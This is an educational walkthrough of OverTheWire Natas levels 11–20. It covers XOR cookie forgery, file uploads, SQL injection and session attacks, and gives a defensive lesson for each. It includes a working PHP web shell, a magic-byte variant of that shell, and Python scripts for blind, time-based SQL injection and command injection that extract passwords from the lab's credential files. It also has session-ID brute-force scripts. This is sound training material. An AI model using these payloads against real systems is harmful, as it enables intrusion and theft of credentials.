# 🌐 OverTheWire: Natas — Level 11 to Level 20 English Guide

> Things get serious in this section: XOR cipher cracking, file upload attacks,  
> SQL injection, blind SQLi, and session/cookie manipulation.  
> We start writing Python scripts!

**Previous section:** [natas_0-10.md](./natas_0-10.md)  
**Reference:** [learnhacking.io](https://learnhacking.io/) · [jameskaois.com](https://jameskaois.com/posts/overthewire-natas-level-7-13/)

---

## 🗺️ Overview

| Level | Topic | Technique |
|---|---|---|
| 11 → 12 | XOR cookie encryption | Cookie cracking + CyberChef |
| 12 → 13 | File Upload | Web shell upload |
| 13 → 14 | Magic byte bypass | JPEG header + PHP web shell |
| 14 → 15 | SQL Injection | `OR "1"="1"` bypass |
| 15 → 16 | Blind SQL Injection | Python brute-force |
| 16 → 17 | Command injection (filtered) | Leaking via grep output with `$()` |
| 17 → 18 | Time-based Blind SQLi | Detecting characters with `SLEEP()` |
| 18 → 19 | Session ID brute-force | Trying 640 possible IDs with Python |
| 19 → 20 | Hex-encoded session | Reverse the ID format |
| 20 → 21 | Session injection | Session poisoning with newline `%0A` |

---

## Level 11 → Level 12 — XOR Cookie Cracking

### 🎯 Task
The site stores background color in an XOR-encrypted cookie. Create a new cookie that sets `showpassword=yes`.

### 📖 Theory: XOR Encryption and Cookie Cracking

**XOR property:**
```
plaintext XOR key = ciphertext
ciphertext XOR key = plaintext
ciphertext XOR plaintext = key   ← this is what we'll use!
```

Cookie creation: `json_encode → XOR → base64_encode`  
Cookie reading: `base64_decode → XOR → json_decode`

If we know both the encrypted cookie and its unencrypted content → XORing them reveals the key!

### 🔧 Solution

**Step 1 — Get the current cookie:**
```
F12 → Application/Storage → Cookies
Copy the "data" cookie value
e.g.: ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=
```

**Step 2 — Note the raw (unencrypted) JSON content:**
```
{"showpassword":"no","bgcolor":"#ffffff"}
```
> ⚠️ Do **not** base64-encode this. Since the scheme is `json → XOR → base64`, finding the key requires the **raw JSON plaintext**: `base64_decode(cookie) XOR raw_json = key`.

**Step 3 — Find the key with CyberChef XOR:**
1. Open [CyberChef](https://gchq.github.io/CyberChef/)
2. Cookie value → "From Base64" operation
3. Result → "XOR" operation (key operand = **raw JSON plaintext**, UTF8: `{"showpassword":"no","bgcolor":"#ffffff"}` — not its base64)
4. Key: `qw8J` (repeating)

**Step 4 — Create a new cookie (`showpassword=yes`):**
1. `{"showpassword":"yes","bgcolor":"#ffffff"}` → XOR (key: `qw8J`) → Base64
2. New cookie value: `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`

**Step 5 — Replace the cookie:**
```
F12 → Application/Storage → Cookies
Replace "data" value with new value → refresh the page
```

> 💡 **Lesson:** A short and repeating XOR key is not secure encryption. If multiple messages are encrypted with the same key, the key is revealed.

---

## Level 12 → Level 13 — Web Shell Upload (File Upload)

### 🎯 Task
There's an image upload form. Upload a PHP web shell and run commands on the server.

### 📖 Theory: Web Shell and Client-Side Bypass

**Web Shell:** A script uploaded to the server that allows command execution over HTTP.

In the source code, the filename is forced to `.jpg` extension on the client-side — but this is done in HTML, not on the server! It can be changed via DevTools.

```php
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
```
This web shell runs via `?e=command`.

### 🔧 Solution

```
1. Create shell.php:
   <?php echo shell_exec($_GET['e'].' 2>&1'); ?>

2. F12 → Elements → find the upload form
   Change the filename extension in the hidden input from ".jpg" to ".php"

3. Upload shell.php → server accepts it as .php

4. Navigate to the given URL + add ?e=:
   http://natas12.natas.labs.overthewire.org/upload/abc123.php?e=cat /etc/natas_webpass/natas13
```

> 💡 **Lesson:** Client-side filtering (browser-side checks) provides no security. File type verification must be done server-side with MIME type and content checks.

---

## Level 13 → Level 14 — Magic Byte Bypass (JPEG Header)

### 🎯 Task
Now `exif_imagetype()` checks whether the file is actually an image. Still upload a PHP shell.

### 📖 Theory: Magic Bytes / File Signature

Every file type carries special bytes at the beginning (magic bytes):
- JPEG: `FF D8 FF` (or `GIF87a`)
- PNG: `89 50 4E 47`

`exif_imagetype()` checks these bytes to determine the file type. If we put a real JPEG header at the beginning of the file, we can still add PHP code!

### 🔧 Solution

```
1. Create shell.php:
   GIF87a<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
   (GIF87a = GIF magic header, server thinks it's an image)

2. F12 → Elements → change filename extension to ".php"

3. Upload the file

4. Uploaded URL + ?e=cat /etc/natas_webpass/natas14
```

> 💡 **Lesson:** File type verification shouldn't rely only on magic bytes. Content analysis, whitelisting, and execution permission restrictions are required.

---

## Level 14 → Level 15 — SQL Injection

### 🎯 Task
There's a login form. Bypass authentication with SQL injection.

### 📖 Theory: SQL Injection

PHP source code:
```php
$query = "SELECT * from users where username=\"" . $_REQUEST["username"] . 
         "\" and password=\"" . $_REQUEST["password"] . "\"";
```

User input is included directly in the SQL query! Consider this input:
```
password: anything" or "1" = "1
```

The resulting query:
```sql
SELECT * FROM users WHERE username="admin" AND password="anything" OR "1"="1"
```

`"1"="1"` is always true → WHERE condition is always true → all users returned → login successful!

### 🔧 Solution

```
Username: admin
Password: anything" or "1"="1

→ "Access granted" and password visible
```

**With curl:**
```bash
curl 'http://natas14.natas.labs.overthewire.org/' \
  -u natas14:<password> \
  --data-raw 'username=admin&password=anything" or "1"="1&debug='
```

> 💡 **Lesson:** User input should never be added directly to a SQL query. Use prepared statements (parameterized queries)!

---

## Level 15 → Level 16 — Blind SQL Injection (Python Brute-force)

### 🎯 Task
This time we only get "user exists/doesn't exist" information. Brute-force character by character with Blind SQLi.

### 📖 Theory: Blind SQL Injection

In the source code:
```php
if(mysqli_num_rows($res) > 0) {
    echo "This user exists.";
} else {
    echo "This user doesn't exist.";
}
```

No direct error but the "exists/doesn't" response gives binary information. We can query each character individually:
```sql
username: natas16" AND password LIKE BINARY "a%" --
```
If "This user exists" is returned → password starts with 'a'!

### 🔧 Solution

```python
import requests
import string

url = "http://natas15.natas.labs.overthewire.org/index.php"
auth = ("natas15", "<password>")
charset = string.ascii_letters + string.digits

found = ""
for i in range(1, 33):
    for ch in charset:
        payload = f'natas16" AND password LIKE BINARY "{found + ch}%" -- '
        res = requests.post(url, data={"username": payload}, auth=auth)
        if "This user exists." in res.text:
            found += ch
            print(f"[+] Found: {found}")
            break

print(f"\n[✅] Password: {found}")
```

> 💡 **Lesson:** Even without error messages, boolean responses like "exists/doesn't" leak information. LIKE BINARY performs case-sensitive search.

---

## Level 16 → Level 17 — Filtered Command Injection (grep leaking)

### 🎯 Task
Now `; | & ' "` characters are filtered. Find another way.

### 📖 Theory: Command Substitution with `$()`

`$()` (command substitution) passes a command's output as an argument to another command in bash. These characters are not filtered!

```bash
# If $() is used inside grep's search term:
grep -i "$(grep ^a /etc/natas_webpass/natas17)anything" dictionary.txt

# If password starts with 'a':
# → inner grep returns something → outer grep finds nothing ("anything" not found)
# If doesn't start with 'a':
# → inner grep returns empty → outer grep searches "anything" → returns result
```

### 🔧 Solution

```python
import requests
import string

url = "http://natas16.natas.labs.overthewire.org/"
auth = ("natas16", "<password>")
charset = string.ascii_letters + string.digits

found = ""
for i in range(1, 33):
    for ch in charset:
        payload = f'$(grep ^{found + ch} /etc/natas_webpass/natas17)'
        res = requests.get(url, params={"needle": payload + "anything"}, auth=auth)
        if "anything" not in res.text:
            found += ch
            print(f"[+] Found: {found}")
            break

print(f"[✅] Password: {found}")
```

> 💡 **Lesson:** Blacklist-based filters are insufficient. There are alternative injection paths like `$()`, backtick. Use a whitelist!

---

## Level 17 → Level 18 — Time-Based Blind SQL Injection

### 🎯 Task
Now there are no messages at all. Use `SLEEP()` to find characters by checking response time.

### 📖 Theory: Time-Based Blind SQLi

Even if nothing appears on screen, the server still processes. With `IF(condition, SLEEP(5), 0)`:
- If condition is true → server waits 5 seconds → response comes late
- If condition is false → returns immediately

```sql
username: natas18" AND IF(BINARY SUBSTRING(password,1,1)="a", SLEEP(5), 0) -- -
```

### 🔧 Solution

```python
import requests, string

url = "http://natas17.natas.labs.overthewire.org/"
auth = ("natas17", "<password>")
charset = string.ascii_letters + string.digits

found = ""
for pos in range(1, 33):
    for ch in charset:
        payload = f'natas18" AND IF(BINARY SUBSTRING(password,{pos},1)="{ch}", SLEEP(5), 0) -- -'
        r = requests.post(url, data={"username": payload}, auth=auth)
        if r.elapsed.total_seconds() > 5:
            found += ch
            print(f"[+] Found: {found}")
            break

print(f"[✅] Password: {found}")
```

> 💡 **Lesson:** Even without any output, timing leaks information. Setting the threshold to 4-5 seconds accounts for network latency.

---

## Level 18 → Level 19 — Session ID Brute-force

### 🎯 Task
Brute-force the `PHPSESSID` value between 1-640 to get the admin session.

### 📖 Theory: Session ID and Security

PHP session IDs are usually random and long. But this level uses simple integers between 1-640 — brute-force is possible!

```
PHPSESSID=1 → normal user
PHPSESSID=2 → normal user
...
PHPSESSID=119 → admin!
```

### 🔧 Solution

```python
import requests

url = "http://natas18.natas.labs.overthewire.org/index.php"
auth = ("natas18", "<password>")

for i in range(0, 641):
    headers = {'Cookie': f'PHPSESSID={i}'}
    response = requests.get(url, headers=headers, auth=auth)
    print(f'[+] Trying: {i}')
    if "You are logged in as a regular user" not in response.text and "login" not in response.text.lower():
        print(f"\n[✅] Admin PHPSESSID: {i}")
        print(response.text[:500])
        break
```

Once you find the correct ID, manually change the cookie in the browser → password appears.

> 💡 **Lesson:** Session IDs must not be short and predictable. Cryptographic randomness is mandatory.

---

## Level 19 → Level 20 — Hex-Encoded Session Format

### 🎯 Task
Session ID is no longer a simple integer — it's in hex encoded `id-username` format. Find the correct hex for `admin`.

### 📖 Theory: Session ID Format Analysis

```
Login: user=test → PHPSESSID: 37342d74657374
Decode: 37 34 2d 74 65 73 74 → "74-test"
```

Format: `{id}-{username}` → hex encoded. For admin: `{id}-admin` → hex.

### 🔧 Solution

```python
import requests

url = "http://natas19.natas.labs.overthewire.org/index.php"
auth = ("natas19", "<password>")

for i in range(0, 641):
    value = f"{i}-admin"
    hex_data = value.encode('utf-8').hex()
    headers = {'Cookie': f'PHPSESSID={hex_data}'}
    print(f'[+] Trying: {value}')
    response = requests.get(url, headers=headers, auth=auth)
    if "You are logged in as a regular user" not in response.text and "login" not in response.text.lower():
        print(f"\n[✅] Admin: {value} / Hex: {hex_data}")
        break
```

Write the correct hex value into the browser cookie → password appears.

---

## Level 20 → Level 21 — Session File Injection (Newline)

### 🎯 Task
Add an `admin=1` line to the session data. Inject a new line into the session file with `%0A` (newline).

### 📖 Theory: Session File Injection

PHP session files are stored line by line in `key value` format:
```
name|s:4:"test";
```

If we can insert a newline (`\n` / `%0A`) into the value, a new line is added:
```
name|s:14:"test
admin 1";
```
→ An `admin = 1` line is created in the session file!

### 🔧 Solution

```
1. Enter in the "Your name" field:
   admin%0Aadmin 1
   (%0A = URL-encoded newline)

2. Submit the form

3. Refresh the page → admin=1 is read → password appears
```

**With curl:**
```bash
# First write
curl -c /tmp/cookies.txt 'http://natas20.natas.labs.overthewire.org/?debug' \
  -u natas20:<password> \
  --data-raw 'name=admin%0Aadmin+1&submit=Submit'

# Then read
curl -b /tmp/cookies.txt 'http://natas20.natas.labs.overthewire.org/?debug' \
  -u natas20:<password>
```

> 💡 **Lesson:** Session data should never be created directly from user input. Newline characters are especially dangerous — sanitize them!

---

## 📚 Web Security Concepts Learned (Level 11-20)

| Concept | Description |
|---|---|
| **XOR Cookie Cracking** | Known plaintext + ciphertext → key |
| **Web Shell** | Command execution script uploaded to server |
| **Magic Byte Bypass** | Bypassing type checking by putting real header at file start |
| **SQL Injection** | Manipulating SQL query with user input |
| **Blind SQLi (Boolean)** | Leaking information from "exists/doesn't" response |
| **Blind SQLi (Time-based)** | Leaking information from response time |
| **Command Injection (filtered)** | Alternative injection with `$()` |
| **Session ID Brute-force** | Trying weak session IDs |
| **Session Injection** | Adding a line to session file with newline |

## 📚 Tools Used

| Tool | Purpose |
|---|---|
| [CyberChef](https://gchq.github.io/CyberChef/) | XOR, base64, hex operations |
| `F12 DevTools` | Cookie, element editing |
| `curl` | Sending HTTP requests |
| `Python requests` | Automated brute-force scripts |
| `xxd -r -p` | Hex decode |

---

**Previous section:** [natas_0-10.md](./natas_0-10.md)  
**Next section:** [natas_21-34.md](./natas_21-34.md)

*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
